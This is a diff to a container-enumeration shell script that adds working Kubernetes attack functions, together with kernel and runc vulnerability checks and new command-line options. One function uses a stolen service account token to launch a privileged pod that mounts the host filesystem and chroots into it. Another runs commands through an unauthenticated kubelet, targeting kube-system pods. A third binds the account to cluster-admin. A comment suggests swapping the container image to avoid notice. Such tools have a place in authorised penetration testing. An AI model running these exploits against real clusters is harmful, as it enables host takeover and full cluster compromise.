+  if [ "$vulnerable1086" = "1" ]; then
+    printYesEx
+    printTip "$TIP_CVE_2024_1086"
   else
     printNo
   fi
@@ -1314,6 +2025,222 @@ EOF
 
 }
 
+exploitK8sPrivilegedPod() {
+  printSection "Exploiting K8s: Privileged Pod"
+  printTip "$TIP_K8S_CREATE_PODS"
+
+  if ! [ -x "$(command -v curl)" ]; then
+    printInstallAdvice "curl"
+    exit 1
+  fi
+
+  saToken="${k8sToken:-$SA_TOKEN_PATH}"
+  if ! [ -f "$saToken" ] || ! [ -r "$saToken" ]; then
+    printError "SA token not found at $saToken"
+    exit 1
+  fi
+
+  if ! [ "$k8sAPI" ]; then
+    if [ "$KUBERNETES_SERVICE_HOST" ]; then
+      k8sPort="${KUBERNETES_SERVICE_PORT:-443}"
+      k8sAPI="https://${KUBERNETES_SERVICE_HOST}:${k8sPort}"
+    else
+      printError "Cannot determine API server URL. Set KUBERNETES_SERVICE_HOST or use --k8s-api"
+      exit 1
+    fi
+  fi
+
+  tokenData=$(cat "$saToken")
+  ns="${k8sNamespace:-default}"
+  podName="deepce-$(tr -dc 'a-z0-9' </dev/urandom 2>/dev/null | head -c 8)"
+
+  prepareExploit
+
+  printMsg "Pod name ................." "$podName"
+  printMsg "Namespace ................" "$ns"
+  printMsg "API server ..............." "$k8sAPI"
+
+  # Pod spec: privileged, hostPID, hostNetwork, hostPath / mount
+  # [MALLEABLE] swap image for one already pulled on target nodes (check node image list first)
+  podSpec="{
+    \"apiVersion\": \"v1\",
+    \"kind\": \"Pod\",
+    \"metadata\": {\"name\": \"$podName\", \"namespace\": \"$ns\"},
+    \"spec\": {
+      \"hostPID\": true,
+      \"hostNetwork\": true,
+      \"restartPolicy\": \"Never\",
+      \"containers\": [{
+        \"name\": \"pwn\",
+        \"image\": \"alpine\",
+        \"securityContext\": {\"privileged\": true},
+        \"command\": [\"/bin/sh\", \"-c\", \"chroot /host sh -c \\\"$cmd\\\"\"],
+        \"volumeMounts\": [{\"name\": \"host\", \"mountPath\": \"/host\"}]
+      }],
+      \"volumes\": [{\"name\": \"host\", \"hostPath\": {\"path\": \"/\"}}]
+    }
+  }"
+
+  printQuestion "Creating privileged pod ."
+  # shellcheck disable=SC2086
+  createResp=$(curl -s $curl_ca --connect-timeout 10 \
+    -X POST \
+    -H "Authorization: Bearer $tokenData" \
+    -H "Content-Type: application/json" \
+    -d "$podSpec" \
+    "$k8sAPI/api/v1/namespaces/$ns/pods" 2>/dev/null)
+
+  if echo "$createResp" | grep -q '"phase"\|"pending"\|"name":"'"$podName"'"'; then
+    printSuccess "Pod created: $podName"
+  else
+    printError "Pod creation failed"
+    printStatus "$createResp"
+    exit 1
+  fi
+
+  printMsg "Waiting for pod ........" "5s"
+  sleep 5
+
+  # Exec into pod via API (requires exec permissions too, fall back to logs for one-shot cmds)
+  printQuestion "Fetching command output .."
+  # shellcheck disable=SC2086
+  logResp=$(curl -s $curl_ca --connect-timeout 10 \
+    -H "Authorization: Bearer $tokenData" \
+    "$k8sAPI/api/v1/namespaces/$ns/pods/$podName/log" 2>/dev/null)
+  if [ "$logResp" ]; then
+    printSuccess "Output:"
+    printStatus "$logResp"
+  else
+    printError "No output yet — pod may still be pulling image"
+    printStatus "Check: kubectl logs -n $ns $podName"
+  fi
+
+  # Cleanup
+  printQuestion "Deleting pod ............"
+  # shellcheck disable=SC2086
+  curl -s $curl_ca -X DELETE \
+    -H "Authorization: Bearer $tokenData" \
+    "$k8sAPI/api/v1/namespaces/$ns/pods/$podName" >/dev/null 2>&1
+  printSuccess "Done"
+}
+
+exploitKubeletExec() {
+  printSection "Exploiting K8s: Kubelet Exec"
+  printTip "$TIP_K8S_KUBELET"
+
+  if ! [ -x "$(command -v curl)" ]; then
+    printInstallAdvice "curl"
+    exit 1
+  fi
+
+  nodeIP="${NODE_IP:-$(hostname -i 2>/dev/null | cut -d' ' -f1)}"
+  if ! [ "$nodeIP" ]; then
+    printError "Cannot determine node IP. Set NODE_IP env var."
+    exit 1
+  fi
+
+  prepareExploit
+
+  # List pods to pick a target in kube-system (highest privilege)
+  printQuestion "Listing pods on node ...."
+  podListResp=$(curl -sk --connect-timeout 5 "https://${nodeIP}:10250/pods" 2>/dev/null)
+  if ! echo "$podListResp" | grep -q '"kind"'; then
+    printError "Kubelet API not accessible without auth on port 10250"
+    exit 1
+  fi
+
+  # Try to find a kube-system pod for elevated execution; fall back to first pod
+  targetNs=$(echo "$podListResp" | grep -o '"namespace":"kube-system"' | head -1 | cut -d'"' -f4)
+  if ! [ "$targetNs" ]; then
+    targetNs=$(echo "$podListResp" | grep -o '"namespace":"[^"]*' | head -1 | cut -d'"' -f4)
+  fi
+  targetPod=$(echo "$podListResp" | grep -o '"name":"[^"]*' | grep -v "metadata\|namespace" | head -1 | cut -d'"' -f4)
+  targetContainer=$(echo "$podListResp" | grep -o '"name":"[^"]*' | grep -v "metadata\|namespace\|pod" | head -1 | cut -d'"' -f4)
+
+  printMsg "Target namespace ........." "$targetNs"
+  printMsg "Target pod ..............." "$targetPod"
+  printMsg "Target container ........." "$targetContainer"
+
+  if ! [ "$targetPod" ] || ! [ "$targetContainer" ]; then
+    printError "Could not identify target pod/container from kubelet response"
+    exit 1
+  fi
+
+  printQuestion "Executing command ......."
+  # shellcheck disable=SC2086
+  execResp=$(curl -sk --connect-timeout 10 \
+    -X POST \
+    "https://${nodeIP}:10250/run/${targetNs}/${targetPod}/${targetContainer}" \
+    --data-urlencode "cmd=$cmd" 2>/dev/null)
+  if [ "$execResp" ]; then
+    printSuccess "Output:"
+    printStatus "$execResp"
+  else
+    printError "No response from kubelet exec endpoint"
+  fi
+}
+
+exploitK8sTokenPrivEsc() {
+  printSection "Exploiting K8s: Token Privilege Escalation"
+
+  if ! [ -x "$(command -v curl)" ]; then
+    printInstallAdvice "curl"
+    exit 1
+  fi
+
+  saToken="${k8sToken:-$SA_TOKEN_PATH}"
+  if ! [ -f "$saToken" ] || ! [ -r "$saToken" ]; then
+    printError "SA token not found"
+    exit 1
+  fi
+
+  if ! [ "$k8sAPI" ]; then
+    if [ "$KUBERNETES_SERVICE_HOST" ]; then
+      k8sPort="${KUBERNETES_SERVICE_PORT:-443}"
+      k8sAPI="https://${KUBERNETES_SERVICE_HOST}:${k8sPort}"
+    else
+      printError "Cannot determine API server URL"
+      exit 1
+    fi
+  fi
+
+  tokenData=$(cat "$saToken")
+  ns="${k8sNamespace:-default}"
+
+  # Bind current SA to cluster-admin via ClusterRoleBinding
+  bindingName="deepce-escalate-$(tr -dc 'a-z0-9' </dev/urandom 2>/dev/null | head -c 6)"
+  currentSA=$(grep -o '"sub":"[^"]*' "$saToken" 2>/dev/null | cut -d'"' -f4 || echo "system:serviceaccount:$ns:default")
+
+  printMsg "Escalation target ......." "$currentSA"
+  printMsg "Binding name ............" "$bindingName"
+
+  bindingSpec="{
+    \"apiVersion\": \"rbac.authorization.k8s.io/v1\",
+    \"kind\": \"ClusterRoleBinding\",
+    \"metadata\": {\"name\": \"$bindingName\"},
+    \"roleRef\": {\"apiGroup\": \"rbac.authorization.k8s.io\", \"kind\": \"ClusterRole\", \"name\": \"cluster-admin\"},
+    \"subjects\": [{\"kind\": \"ServiceAccount\", \"name\": \"default\", \"namespace\": \"$ns\"}]
+  }"
+
+  printQuestion "Binding to cluster-admin ."
+  # shellcheck disable=SC2086
+  bindResp=$(curl -s $curl_ca --connect-timeout 10 \
+    -X POST \
+    -H "Authorization: Bearer $tokenData" \
+    -H "Content-Type: application/json" \
+    -d "$bindingSpec" \
+    "$k8sAPI/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" 2>/dev/null)
+
+  if echo "$bindResp" | grep -q '"name":"'"$bindingName"'"'; then
+    printYesEx
+    printStatus "Cluster-admin binding created: $bindingName"
+    printStatus "You now have cluster-admin. Clean up: kubectl delete clusterrolebinding $bindingName"
+  else
+    printError "Binding failed"
+    printStatus "$bindResp"
+  fi
+}
+
 ###########################################
 #--------------) Arg Parse (--------------#
 ###########################################
@@ -1387,6 +2314,28 @@ while [ $# -gt 0 ]; do
     delete="1"
     shift
     ;;
+  -k | --kubernetes | --k8s)
+    forceKubernetes="1"
+    shift
+    ;;
+  -km | --k8s-metadata | --metadata)
+    k8sCheckMetadata="1"
+    shift
+    ;;
+  -ke | --k8s-exploit)
+    k8sExploit="1"
+    shift
+    ;;
+  --token)
+    k8sToken="$2"
+    shift
+    shift
+    ;;
+  --k8s-api)
+    k8sAPIOverride="$2"
+    shift
+    shift
+    ;;
   *)
     echo "Unknown option $1"
     exit 1
@@ -1413,16 +2362,35 @@ if ! [ "$skipEnum" ]; then
     # Inside Container
     printYes
     containerType
+    getContainerRuntime
     containerTools
     userCheck
+
     if [ "$containerType" = "docker" ]; then
       getDockerVersion
       dockerSockCheck
       checkDockerVersionExploits
     fi
+
+    # runc and kernel checks apply in all container types
+    checkRuncVersionExploits
+    checkKernelVersionExploits
+
     enumerateContainer
     findMountedFolders
     findInterestingFiles
+
+    if [ "$containerType" = "kubernetes" ]; then
+      enumerateKubernetes
+    elif [ "$forceKubernetes" ]; then
+      enumerateKubernetes
+    fi
+
+    # Always check cloud metadata if flag set
+    if [ "$k8sCheckMetadata" ] && [ "$containerType" != "kubernetes" ]; then
+      checkCloudMetadata
+    fi
+
     enumerateContainers
   else
     # Outside Container
@@ -1432,6 +2400,8 @@ if ! [ "$skipEnum" ]; then
     getDockerVersion
     dockerSockCheck
     checkDockerVersionExploits
+    checkRuncVersionExploits
+    checkKernelVersionExploits
     enumerateContainers
   fi
 fi
@@ -1450,6 +2420,15 @@ if [ "$exploit" ]; then
     ;;
   sys | SYS | sys_module | SYS_MODULE)
     exploitSysModule
+    ;;
+  k8s_pod | K8S_POD | k8spod)
+    exploitK8sPrivilegedPod
+    ;;
+  k8s_kubelet | K8S_KUBELET | kubelet)
+    exploitKubeletExec
+    ;;
+  k8s_escalate | K8S_ESCALATE | k8s_privesc)
+    exploitK8sTokenPrivEsc
     ;;
   *)
     echo "Unknown exploit $1"
